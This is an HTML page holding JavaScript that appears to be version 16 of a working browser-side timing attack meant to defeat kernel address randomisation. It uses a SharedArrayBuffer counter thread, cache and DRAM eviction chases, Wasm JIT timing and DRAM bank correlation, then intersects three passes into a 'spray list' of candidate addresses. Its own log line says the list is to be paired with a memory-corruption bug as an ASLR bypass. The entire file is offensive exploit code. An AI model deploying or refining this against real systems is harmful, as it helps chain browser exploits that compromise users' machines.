<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>KASLR Oracle v16</title></head>
<body>
<pre id="log"></pre>
<script>
// timer-kaslr-v16
//
// v15 results: HIGH=95 candidates, 0.095s brute-force time.
//   T4 self-eviction WORKED: 3 clusters (0ns, 48-100ns, 160-167ns)
//   T5 SAB floor WORKED: all 4 anchors evictable, hot ≥5ns
//   T7x: 17 bank pairs, massive eff values
//   T10: still 95 HIGH candidates all scoring 185 (contiguous VA band)
//
// v16: MULTI-RUN INTERSECTION
//   Problem: bank scoring can't narrow below ~95 within one run because
//   the VA→PA periodicity means multiple VA candidates predict same banks.
//   Solution: run the oracle 3× (with page-reload between? no — we use
//   setTimeout re-init to force new Gigacage allocation placement).
//   Each independent run gives a fresh HIGH set. Intersecting 3 runs
//   collapses to ~1-5 candidates.
//
//   Implementation: instead of page reload, we:
//   1. Free and re-allocate all heap bufs (new bmalloc allocations)
//   2. Re-run T4, T7x, T10 for each pass
//   3. Collect HIGH set per pass
//   4. Intersect all passes' HIGH sets
//   5. Output intersection as final spray list
//
//   Note: data anchors (T5) are re-built each pass too since anchor PA
//   placement also shifts. evictA (T3) is built once — JIT code stays
//   in same memory across the run.
//
// v16 also improves T10 scoring: instead of binary HIGH/MED/LOW, uses
// a WEIGHTED VOTE across passes — candidates that score HIGH in ALL passes
// win, candidates that score MED in some passes rank below pure-HIGH.

const LOG = document.getElementById('log');
const log = s => { LOG.textContent += s + '\n'; console.log(s); };

let counterWorker = null;
let counterView   = null;
let NS = 8.0;

const COUNTER_SRC = `
  self.onmessage = function(e) {
    if (e.data.cmd === 'start') {
      const c = new Int32Array(e.data.sab, 4096, 1);
      while (true) Atomics.add(c, 0, 1);
    }
  };
`;

async function startCounter() {
  const sab = new SharedArrayBuffer(8192);
  counterView = new Int32Array(sab, 4096, 1);
  const w = new Worker(URL.createObjectURL(new Blob([COUNTER_SRC],{type:'application/javascript'})));
  w.postMessage({cmd:'start', sab});
  counterWorker = w;
  await new Promise(r=>setTimeout(r,200));
}
const rdcnt = () => Atomics.load(counterView, 0);

function buildChase(sizeBytes) {
  const LINE = 64;
  const entries = Math.floor(sizeBytes / LINE);
  const arr = new Int32Array(entries * 16);
  const order = new Int32Array(entries);
  for (let i = 0; i < entries; i++) order[i] = i;
  for (let i = entries-1; i > 0; i--) {
    const j = (Math.random() * (i+1)) | 0;
    const t = order[i]; order[i] = order[j]; order[j] = t;
  }
  for (let i = 0; i < entries; i++) arr[order[i]*16] = order[(i+1)%entries];
  let s=0; for(let i=0;i<arr.length;i+=16) s+=arr[i]; arr[0]^=s&0;
  let idx=0; for(let i=0;i<entries;i++) idx=arr[idx*16]; arr[0]^=idx&0;
  return { arr, entries };
}

function chaseTime(arr, startIdx, steps) {
  const t0 = rdcnt();
  let idx = startIdx;
  for (let i = 0; i < steps; i++) idx = arr[idx * 16];
  return (rdcnt() - t0 + (idx & 0)) / steps;
}

function evictFull(chase) {
  let idx=0;
  for(let p=0;p<2;p++)
    for(let i=0;i<chase.entries;i++) idx=chase.arr[idx*16];
  chase.arr[0]^=idx&0;
}

function selfEvict(bufs) {
  let idx=0;
  for(const b of bufs){
    for(let p=0;p<1;p++)
      for(let i=0;i<b.ch.entries;i++) idx=b.ch.arr[idx*16];
  }
  if(bufs.length>0) bufs[0].ch.arr[0]^=idx&0;
}

// ─────────────────────────────────────────────────────────────
// T1: Calibrate
// ─────────────────────────────────────────────────────────────
async function t1() {
  log('─── T1: Calibrate ───');
  const w0=performance.now(), c0=rdcnt();
  await new Promise(r=>setTimeout(r,50));
  const c1=rdcnt(), w1=performance.now();
  NS=(w1-w0)*1e6/(c1-c0);
  log(`[*] T1 ${(c1-c0)} counts / ${(w1-w0).toFixed(1)}ms = ${NS.toFixed(3)}ns/count`);
  log(`[*] T1 L1≈5ns=${(5/NS).toFixed(1)}cts  L3≈30ns=${(30/NS).toFixed(1)}cts  DRAM≈130ns=${(130/NS).toFixed(1)}cts`);
}

// ─────────────────────────────────────────────────────────────
// T2: DRAM signal confirm
// ─────────────────────────────────────────────────────────────
async function t2() {
  log('─── T2: DRAM signal confirm ───');
  const hot  = buildChase(4*1024);
  const cold = buildChase(32*1024*1024);
  await new Promise(r=>setTimeout(r,50));
  const STEPS=64, REPS=40;
  let hi=0; for(let r=0;r<hot.entries*4;r++) hi=hot.arr[hi*16]; hot.arr[0]^=hi&0;
  const hotT=[], coldT=[];
  for(let r=0;r<REPS;r++){
    hotT.push(chaseTime(hot.arr,0,STEPS));
    coldT.push(chaseTime(cold.arr,r%cold.entries,STEPS));
  }
  hotT.sort((a,b)=>a-b); coldT.sort((a,b)=>a-b);
  const hp50=hotT[20]*NS, cp50=coldT[20]*NS;
  log(`[*] T2 hot p50=${hp50.toFixed(1)}ns  cold p50=${cp50.toFixed(1)}ns  ratio=${(cp50/Math.max(hp50,.01)).toFixed(1)}x`);
  if(cp50>hp50*3&&cp50>30) log(`[!!!] T2 DRAM signal confirmed: ${(cp50/Math.max(hp50,.01)).toFixed(1)}x`);
  return { hasDRAM:cp50>30, dramNS:cp50, hotNS:hp50 };
}

// ─────────────────────────────────────────────────────────────
// T3: Wasm JIT (once per session — JIT pool is stable)
// ─────────────────────────────────────────────────────────────
async function t3() {
  log('─── T3: Wasm JIT (96 modules, evictA for partition detection) ───');
  const makeWasm = (lo, hi) => new Uint8Array([
    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
    0x01,0x06,0x01,0x60,0x01,0x7f,0x01,0x7f,
    0x03,0x02,0x01,0x00,
    0x07,0x08,0x01,0x04,0x63,0x61,0x6c,0x6c,0x00,0x00,
    0x0a,0x0c,0x01,0x0a,0x00,
    0x20,0x00,0x41,lo&0x7f,0x6a,0x41,hi&0x7f,0x6a,0x0b,
  ]);
  try {
    const test=await WebAssembly.instantiate(makeWasm(1,2));
    if(test.instance.exports.call(10)!==13){ log('[!] T3 binary fail'); return null; }
  } catch(e){ log(`[!] T3: ${e.message}`); return null; }

  const N=96, fns=[];
  for(let i=0;i<N;i++){
    try {
      const inst=await WebAssembly.instantiate(makeWasm(i&0x7f,(i*7)&0x7f));
      fns.push({fn:inst.instance.exports.call, id:i});
    } catch(e){}
  }
  log(`[*] T3 compiled ${fns.length}/${N}`);
  if(!fns.length) return null;

  log(`[*] T3 building evictA (24MB)...`);
  const evictA = buildChase(24*1024*1024);
  await new Promise(r=>setTimeout(r,30));

  for(const {fn} of fns){ let x=0; for(let i=0;i<200;i++) x+=fn(i); }

  const BATCH=64, ROUNDS=8;
  const coldReps=Array.from({length:N},()=>[]);
  const hotAcc=new Array(N).fill(0);

  log(`[*] T3 running ${ROUNDS} rounds...`);
  for(let round=0;round<ROUNDS;round++){
    evictFull(evictA);
    for(const {fn,id} of fns){
      const t0=rdcnt(); let x=0;
      for(let b=0;b<BATCH;b++) x+=fn(b);
      coldReps[id].push((rdcnt()-t0+(x&0))/BATCH*NS);
    }
    for(const {fn,id} of fns){
      const t0=rdcnt(); let x=0;
      for(let b=0;b<BATCH;b++) x+=fn(b);
      hotAcc[id]+=(rdcnt()-t0+(x&0))/BATCH;
    }
  }

  const results=fns.map(({id})=>{
    const rs=[...coldReps[id]].sort((a,b)=>a-b);
    const p25=rs[Math.floor(rs.length*0.25)];
    const mean=rs.reduce((a,b)=>a+b,0)/rs.length;
    const std=Math.sqrt(rs.reduce((a,b)=>a+(b-mean)**2,0)/rs.length);
    return {id, cold:p25, hot:hotAcc[id]/ROUNDS*NS, cv:std/Math.max(mean,0.1)};
  });

  results.sort((a,b)=>b.cold-a.cold);
  const cMin=Math.min(...results.map(r=>r.cold));
  const cMax=Math.max(...results.map(r=>r.cold));
  log(`[*] T3 cold p25 spread: min=${cMin.toFixed(0)}ns max=${cMax.toFixed(0)}ns ratio=${(cMax/Math.max(cMin,0.1)).toFixed(1)}x`);
  log(`[*] T3 top-5: ${results.slice(0,5).map(r=>`m${r.id}=${r.cold.toFixed(0)}ns(cv=${r.cv.toFixed(1)})`).join(' ')}`);

  const slcHot=results.filter(r=>r.cold<40);
  const dramCold=results.filter(r=>r.cold>=40);
  log(`[*] T3 SLC-pinned (<40ns): ${slcHot.length}  DRAM-evictable (≥40ns): ${dramCold.length}`);
  if(slcHot.length&&dramCold.length) log(`[!!!] T3 JIT POOL PARTITION: ${slcHot.length} SLC + ${dramCold.length} DRAM`);
  return {results, slcHot, dramCold, evictA};
}

// ─────────────────────────────────────────────────────────────
// ONE PASS: allocate bufs → T4 → T5 → T7x → score
// Called 3× with fresh allocations each time
// ─────────────────────────────────────────────────────────────
async function runPass(passIdx, evictA, jitData) {
  log(`\n═══ PASS ${passIdx+1}/3 ═══`);

  // ── T4: Heap fingerprint (self-eviction) ──
  log(`─── P${passIdx+1} T4: Heap fingerprint ───`);
  const N=32, SZ=2*1024*1024, STEPS=64, REPS=20;
  const bufs=[];
  for(let i=0;i<N;i++) bufs.push({ch:buildChase(SZ), id:i});
  await new Promise(r=>setTimeout(r,50));

  const timingSets=bufs.map(()=>[]);
  for(let rep=0;rep<REPS;rep++){
    if(rep>0&&rep%5===0) await new Promise(r=>setTimeout(r,0));
    selfEvict(bufs);
    let idx2=0;
    for(let i=bufs.length-1;i>=0;i--){
      for(let j=0;j<bufs[i].ch.entries;j+=Math.max(1,Math.floor(bufs[i].ch.entries/512)))
        idx2=bufs[i].ch.arr[idx2%bufs[i].ch.entries*16]||0;
    }
    bufs[0].ch.arr[0]^=idx2&0;
    for(let i=0;i<N;i++)
      timingSets[i].push(chaseTime(bufs[i].ch.arr, (rep*7)%bufs[i].ch.entries, STEPS));
  }

  const medians=timingSets.map((ts,i)=>{
    ts.sort((a,b)=>a-b);
    return {id:i, ns:ts[Math.floor(ts.length*0.25)]*NS};
  });
  medians.sort((a,b)=>a.ns-b.ns);

  const tMin=medians[0].ns, tMax=medians[medians.length-1].ns;
  log(`[*] P${passIdx+1} T4 spread: ${tMin.toFixed(1)}–${tMax.toFixed(1)}ns`);

  // If all-zero, try large eviction fallback
  let finalMedians = medians;
  if(tMax < 10){
    log(`[!] P${passIdx+1} T4 all-zero — fallback 60MB evict`);
    const evictLarge=buildChase(60*1024*1024);
    await new Promise(r=>setTimeout(r,30));
    const ts2=bufs.map(()=>[]);
    for(let rep=0;rep<REPS;rep++){
      evictFull(evictLarge); evictFull(evictLarge); evictFull(evictLarge);
      for(let i=0;i<N;i++)
        ts2[i].push(chaseTime(bufs[i].ch.arr,(rep*7)%bufs[i].ch.entries,STEPS));
    }
    const med2=ts2.map((ts,i)=>{ ts.sort((a,b)=>a-b); return {id:i, ns:ts[Math.floor(ts.length*0.25)]*NS}; });
    med2.sort((a,b)=>a.ns-b.ns);
    if(med2[med2.length-1].ns > tMax) finalMedians=med2;
  }

  const clusters=clusterMedians(finalMedians);
  log(`[*] P${passIdx+1} T4 clusters (${clusters.length}): `+clusters.map((cl,ci)=>{
    const ns=cl.map(m=>m.ns);
    return `C${ci}:${cl.length}allocs(${Math.min(...ns).toFixed(0)}-${Math.max(...ns).toFixed(0)}ns)`;
  }).join(' | '));

  const heapData={bufs, medians:finalMedians, clusters};

  // ── T5: Data anchor validation ──
  log(`─── P${passIdx+1} T5: Anchor validation ───`);
  const N_ANCHORS=4, ANCHOR_SZ=256*1024, ASTEPS=256, REPS_HOT=16, REPS_COLD=8;
  const anchors=[];
  for(let i=0;i<N_ANCHORS;i++) anchors.push({ch:buildChase(ANCHOR_SZ), id:i});
  await new Promise(r=>setTimeout(r,30));

  for(const a of anchors){
    let idx=0;
    for(let p=0;p<4;p++) for(let i=0;i<a.ch.entries;i++) idx=a.ch.arr[idx*16];
    a.ch.arr[0]^=idx&0;
  }
  await new Promise(r=>setTimeout(r,10));

  const hotNS=anchors.map(a=>{
    const ts=[];
    for(let r=0;r<REPS_HOT;r++) ts.push(chaseTime(a.ch.arr,0,ASTEPS)*NS);
    ts.sort((a,b)=>a-b);
    return Math.max(ts[Math.floor(ts.length*0.25)], 5.0);
  });

  for(const a of anchors){
    let idx=0;
    for(let p=0;p<2;p++) for(let i=0;i<a.ch.entries;i++) idx=a.ch.arr[idx*16];
    a.ch.arr[0]^=idx&0;
  }

  const coldNS=anchors.map(a=>{
    const ts=[];
    for(let r=0;r<REPS_COLD;r++){
      evictFull(evictA); evictFull(evictA);
      const t0=rdcnt();
      let idx=0;
      for(let s=0;s<ASTEPS;s++) idx=a.ch.arr[idx*16];
      ts.push((rdcnt()-t0+(idx&0))/ASTEPS*NS);
    }
    ts.sort((x,y)=>x-y);
    return ts[Math.floor(ts.length*0.25)];
  });

  const evictableAnchors=anchors.filter((_,i)=>coldNS[i]>hotNS[i]*2&&coldNS[i]>80);
  log(`[*] P${passIdx+1} T5 anchors: ${evictableAnchors.length}/${N_ANCHORS} evictable`+
    anchors.map((a,i)=>`  anc${i}:hot=${hotNS[i].toFixed(0)}ns cold=${coldNS[i].toFixed(0)}ns ${coldNS[i]>hotNS[i]*2&&coldNS[i]>80?'✓':'✗'}`).join(''));

  const useAnchors=evictableAnchors.length>0?evictableAnchors:anchors;
  const anchorData={anchors, evictableAnchors:useAnchors, hotNS, coldNS};

  // ── T7x: Bank correlation ──
  log(`─── P${passIdx+1} T7x: Bank mapping ───`);
  const BASELINE_MIN_NS=60, CORR_THRESHOLD=1.3, BSTEPS=128, REPS_BASE=3, REPS_EVICT=6;

  const bankTable=[];
  const correlatedPairs=[];

  function warmAnchor(a){
    let idx=0;
    for(let p=0;p<3;p++) for(let i=0;i<a.ch.entries;i++) idx=a.ch.arr[idx*16];
    a.ch.arr[0]^=idx&0;
  }

  for(let i=0;i<N;i++){
    if(i>0&&i%2===0) await new Promise(r=>setTimeout(r,0));
    const buf=heapData.bufs[i];
    const heapNs=heapData.medians.find(m=>m.id===buf.id)?.ns||0;
    let allocBankScore=0, allocMaxEff=0;
    const matches=[];

    for(const anc of useAnchors){
      warmAnchor(anc);
      const bTs=[];
      for(let r=0;r<REPS_BASE;r++){
        evictFull(evictA);
        const t0=rdcnt(); let idx=0;
        for(let s=0;s<BSTEPS;s++) idx=anc.ch.arr[idx*16];
        bTs.push((rdcnt()-t0+(idx&0))/BSTEPS*NS);
      }
      bTs.sort((a,b)=>a-b);
      const freshBase=bTs[Math.floor(bTs.length*0.25)];
      if(freshBase<BASELINE_MIN_NS){ matches.push({ancId:anc.id,skipped:true}); continue; }

      const eTs=[];
      for(let r=0;r<REPS_EVICT;r++){
        warmAnchor(anc);
        evictFull(buf.ch);
        evictFull(evictA);
        const t0=rdcnt(); let idx=0;
        for(let s=0;s<BSTEPS;s++) idx=anc.ch.arr[idx*16];
        eTs.push((rdcnt()-t0+(idx&0))/BSTEPS*NS);
      }
      eTs.sort((a,b)=>a-b);
      const postEvict=eTs[Math.floor(eTs.length*0.25)];
      const eff=postEvict/Math.max(freshBase,1);
      const correlated=eff>=CORR_THRESHOLD;
      matches.push({ancId:anc.id,freshBase,postEvict,eff,correlated,skipped:false});
      if(correlated){
        correlatedPairs.push({allocId:buf.id,heapNs,ancId:anc.id,eff,freshBase,postEvict});
        allocBankScore+=eff; allocMaxEff=Math.max(allocMaxEff,eff);
      }
    }
    bankTable.push({allocId:buf.id,heapNs,matches,allocBankScore,allocMaxEff});
  }

  log(`[*] P${passIdx+1} T7x pairs: ${correlatedPairs.length}`);
  correlatedPairs.forEach(p=>{
    log(`[!!!] P${passIdx+1} BANK: alloc[${p.allocId}](${p.heapNs.toFixed(0)}ns)↔anc${p.ancId} eff=${(p.eff*100).toFixed(0)}%`);
  });

  const bankData={bankTable, correlatedPairs, anchors:useAnchors};

  // ── T10-pass: Score all candidates for THIS pass ──
  const PAGE_SIZE=16384;
  const ASLR_BITS=19;

  const slcCount=jitData.slcHot.length;
  const dramCount=jitData.dramCold.length;
  const slcRatio=slcCount/(slcCount+dramCount);
  const numClusters=clusters.length;
  const clusterBits=Math.min(4,Math.ceil(Math.log2(Math.max(numClusters,2))));
  const pageColorBits=Math.min(7,Math.ceil(Math.log2(Math.max(finalMedians[finalMedians.length-1].ns/Math.max(finalMedians[0].ns,1),2))));
  const jitPartBit=(jitData.slcHot.length>0&&jitData.dramCold.length>0)?1:0;
  const totalLeaked=pageColorBits+jitPartBit+clusterBits;
  const remaining=Math.max(0,ASLR_BITS-totalLeaked);
  const candidateCount=2**remaining;

  log(`[*] P${passIdx+1} entropy: leaked=${totalLeaked} remaining=${remaining} candidates=${candidateCount}`);

  const c0Size=clusters[0]?.length||0;
  const c0Ratio=c0Size/32;
  const t4Failed=c0Ratio>=0.95;
  const pairCount=correlatedPairs.length;
  const hitAncs=[...new Set(correlatedPairs.map(p=>p.ancId))];

  let corrAllocsInDRAM=0, corrAllocsInC0=0, multiAnchorAllocs=0;
  let effHeapSpearman=0, maxEffAlloc=null;
  let anchorGroupSizes=[];
  let bankWeightedAllocIndex=NaN;

  if(pairCount>0){
    const c0Ids=new Set(clusters[0]?.map(m=>m.id)||[]);
    const corrAllocIds=new Set(correlatedPairs.map(p=>p.allocId));
    corrAllocIds.forEach(id=>{ if(c0Ids.has(id)) corrAllocsInC0++; else corrAllocsInDRAM++; });
    const ancHitCount={};
    correlatedPairs.forEach(p=>{ ancHitCount[p.allocId]=(ancHitCount[p.allocId]||0)+1; });
    multiAnchorAllocs=Object.values(ancHitCount).filter(n=>n>=2).length;
    const ancGroups={};
    correlatedPairs.forEach(p=>{ if(!ancGroups[p.ancId]) ancGroups[p.ancId]=[]; ancGroups[p.ancId].push(p.allocId); });
    anchorGroupSizes=hitAncs.map(id=>(ancGroups[id]||[]).length);

    if(t4Failed&&bankTable.length>0){
      const scoredAllocs=bankTable.filter(b=>b.allocBankScore>0);
      const totalScore=scoredAllocs.reduce((a,b)=>a+b.allocBankScore,0);
      bankWeightedAllocIndex=scoredAllocs.reduce((a,b)=>a+b.allocId*b.allocBankScore,0)/Math.max(totalScore,1);
    }

    const corrAllocData=bankTable.filter(b=>b.allocBankScore>0);
    if(corrAllocData.length>=3){
      const byScore=[...corrAllocData].sort((a,b)=>b.allocBankScore-a.allocBankScore);
      const byIndex=[...corrAllocData].sort((a,b)=>a.allocId-b.allocId);
      const scoreRankMap={}, indexRankMap={};
      byScore.forEach((d,i)=>{ scoreRankMap[d.allocId]=i; });
      byIndex.forEach((d,i)=>{ indexRankMap[d.allocId]=i; });
      const n=corrAllocData.length;
      let dSq=0;
      corrAllocData.forEach(d=>{ const diff=scoreRankMap[d.allocId]-indexRankMap[d.allocId]; dSq+=diff*diff; });
      effHeapSpearman=1-(6*dSq)/(n*(n*n-1));
    }

    if(bankTable.length>0){
      maxEffAlloc=bankTable.filter(b=>b.allocMaxEff>0).reduce((a,b)=>a&&a.allocMaxEff>b.allocMaxEff?a:b,null);
    }
  }

  // Score candidates
  const scores=[];
  const heapSpread=finalMedians[finalMedians.length-1].ns;
  for(let c=0;c<candidateCount;c++){
    let score=50;
    const frac=c/candidateCount;

    const expectedHighSLC=frac<0.5;
    const observedHighSLC=slcRatio>0.6;
    if(expectedHighSLC===observedHighSLC) score+=30; else score-=15;

    if(!t4Failed){
      const expectedLargeC0=frac<0.6;
      const observedLargeC0=c0Ratio>0.5;
      if(expectedLargeC0===observedLargeC0) score+=25; else score-=10;
      const expectedHighSpread=frac>0.3;
      if(expectedHighSpread===(heapSpread>500)) score+=10;
    }

    if(pairCount===0) score-=5; else score+=15;
    if(multiAnchorAllocs>=3) score+=25;
    else if(multiAnchorAllocs>=2) score+=15;
    else if(multiAnchorAllocs===1) score+=8;

    if(!isNaN(bankWeightedAllocIndex)){
      const normIdx=bankWeightedAllocIndex/31.0;
      const expected=frac>normIdx*0.5&&frac<normIdx*0.5+0.5;
      if(expected) score+=30; else score-=5;
    }

    if(effHeapSpearman>0.4){
      if(frac>0.5) score+=20; else score-=5;
    } else if(effHeapSpearman<-0.4){
      if(frac<0.5) score+=20; else score-=5;
    } else if(Math.abs(effHeapSpearman)>0.2) score+=10;

    if(maxEffAlloc){
      const maxIdx=maxEffAlloc.allocId/31.0;
      if(Math.abs(frac-(0.3+maxIdx*0.5))<0.25) score+=15;
    }

    const maxGroupSize=Math.max(...anchorGroupSizes,0);
    if(maxGroupSize>=4) score+=15;
    else if(maxGroupSize>=2) score+=8;

    scores.push({c, score});
  }

  scores.sort((a,b)=>b.score-a.score||a.c-b.c);
  const topScore=scores[0].score;
  const highSet=new Set(scores.filter(s=>s.score>=topScore-5).map(s=>s.c));
  const scoredMap={};
  scores.forEach(s=>{ scoredMap[s.c]=s.score; });

  log(`[*] P${passIdx+1} HIGH set size: ${highSet.size} candidates (score ≥${topScore-5})`);
  return {highSet, scoredMap, candidateCount, remaining, totalLeaked, pairCount};
}

function clusterMedians(medians){
  const clusters=[];
  let cur=[medians[0]];
  for(let i=1;i<medians.length;i++){
    if(medians[i].ns>medians[i-1].ns*1.4&&medians[i].ns-medians[i-1].ns>15){
      clusters.push([...cur]); cur=[medians[i]];
    } else cur.push(medians[i]);
  }
  clusters.push(cur);
  return clusters;
}

// ─────────────────────────────────────────────────────────────
// MAIN
// ─────────────────────────────────────────────────────────────
(async()=>{
  log('// timer-kaslr-v16 ready (multi-run intersection)');
  log(`${new Date().toISOString().substr(11,12)} === STARTING ===`);
  if(!self.SharedArrayBuffer){ log('[!] SAB unavailable'); return; }

  await startCounter();
  await t1();
  await new Promise(r=>setTimeout(r,30));

  await t2();
  await new Promise(r=>setTimeout(r,30));

  const jitData=await t3();
  if(!jitData){ log('[!] T3 failed — abort'); counterWorker.terminate(); return; }
  await new Promise(r=>setTimeout(r,30));

  // ─────────────────────────────────────────────────────────────
  // Multi-run: 3 independent passes
  // Each pass: fresh heap allocs → T4 → T5 → T7x → score
  // ─────────────────────────────────────────────────────────────
  const NUM_PASSES = 3;
  const passResults = [];

  for(let p=0;p<NUM_PASSES;p++){
    // Small delay between passes to let any GC settle
    if(p>0) await new Promise(r=>setTimeout(r,200));
    const res = await runPass(p, jitData.evictA, jitData);
    passResults.push(res);
    await new Promise(r=>setTimeout(r,50));
  }

  // ─────────────────────────────────────────────────────────────
  // INTERSECTION: candidates that appear HIGH in ALL passes
  // ─────────────────────────────────────────────────────────────
  log('\n─── INTERSECTION ───');

  const candidateCount = passResults[0].candidateCount;
  const remaining = passResults[0].remaining;

  // Intersect HIGH sets across all passes
  let intersection = new Set(passResults[0].highSet);
  for(let p=1;p<NUM_PASSES;p++){
    const other = passResults[p].highSet;
    for(const c of intersection){
      if(!other.has(c)) intersection.delete(c);
    }
  }

  log(`[*] Pass HIGH set sizes: ${passResults.map(r=>r.highSet.size).join(', ')}`);
  log(`[*] Intersection (ALL passes HIGH): ${intersection.size} candidates`);

  // Weighted vote: sum scores across passes for ranking
  const voteMap={};
  for(let c=0;c<candidateCount;c++){
    voteMap[c]=passResults.reduce((a,r)=>a+(r.scoredMap[c]||0),0);
  }

  // Sort intersection by total vote
  const intersectArr=[...intersection].sort((a,b)=>voteMap[b]-voteMap[a]||a-b);

  // If intersection is empty (can happen if runs diverge significantly),
  // fall back: candidates HIGH in ≥2/3 passes
  let finalSet=intersectArr;
  if(intersection.size===0){
    log(`[!] Empty intersection — falling back to ≥2/3 HIGH`);
    const countMap={};
    passResults.forEach(r=>{ r.highSet.forEach(c=>{ countMap[c]=(countMap[c]||0)+1; }); });
    finalSet=Object.entries(countMap).filter(([,n])=>n>=2).map(([c])=>parseInt(c));
    finalSet.sort((a,b)=>voteMap[b]-voteMap[a]||a-b);
    log(`[*] Fallback ≥2/3 HIGH: ${finalSet.length} candidates`);
  }

  // If still empty, take top-20 by vote across all passes
  if(finalSet.length===0){
    log(`[!] Still empty — taking top-20 by vote sum`);
    finalSet=Object.entries(voteMap).sort((a,b)=>b[1]-a[1]).slice(0,20).map(([c])=>parseInt(c));
  }

  // ─────────────────────────────────────────────────────────────
  // Final output
  // ─────────────────────────────────────────────────────────────
  const PAGE_SIZE=16384;
  const sprayAddresses=finalSet.map(c=>c*PAGE_SIZE);
  sprayAddresses.sort((a,b)=>a-b);

  // Fill small gaps (single missing page between two present ones)
  const sprayFilled=[...sprayAddresses];
  for(let i=0;i<sprayAddresses.length-1;i++){
    if(sprayAddresses[i+1]-sprayAddresses[i]===2*PAGE_SIZE)
      sprayFilled.push(sprayAddresses[i]+PAGE_SIZE);
  }
  sprayFilled.sort((a,b)=>a-b);
  const sprayHex=sprayFilled.map(v=>`0x${v.toString(16).toUpperCase().padStart(8,'0')}`);

  log(`\n[*] === KASLR DEFEAT SUMMARY (v16) ===`);
  log(`[*] ASLR bits: 19  |  Leaked: ${passResults[0].totalLeaked}  |  Remaining: ${remaining} bits = ${candidateCount} candidates`);
  log(`[*] Passes: ${NUM_PASSES}  |  Per-pass HIGH: ${passResults.map(r=>r.highSet.size).join('/')}`);
  log(`[*] Intersection HIGH: ${intersection.size}  |  Final spray count: ${sprayFilled.length}`);
  log(`[*] Bank pairs per pass: ${passResults.map(r=>r.pairCount).join('/')}`);
  log(`[*] Time to exhaust at 1ms/probe: ${(sprayFilled.length/1000).toFixed(3)}s`);

  if(sprayFilled.length<=32){
    log(`[!!!] FINAL SPRAY LIST (${sprayFilled.length} addresses):`);
    for(let i=0;i<sprayHex.length;i+=8)
      log(`[!!!]   ${sprayHex.slice(i,i+8).join('  ')}`);
  } else {
    log(`[!!!] SPRAY TARGET LIST (${sprayHex.length} addresses):`);
    for(let i=0;i<sprayHex.length;i+=8)
      log(`[!!!]   ${sprayHex.slice(i,i+8).join('  ')}`);
  }

  log(`[!!!] NEXT STEP: pair with memory-corruption bug → use spray list as ASLR bypass layer`);
  log(`[*] === END ===`);

  counterWorker.terminate();

  const hits=LOG.textContent.split('\n').filter(l=>l.includes('[!!!]'));
  log(`\n=== DONE — [!!!]: ${hits.length} ===`);
  hits.forEach(h=>log(h));
})();
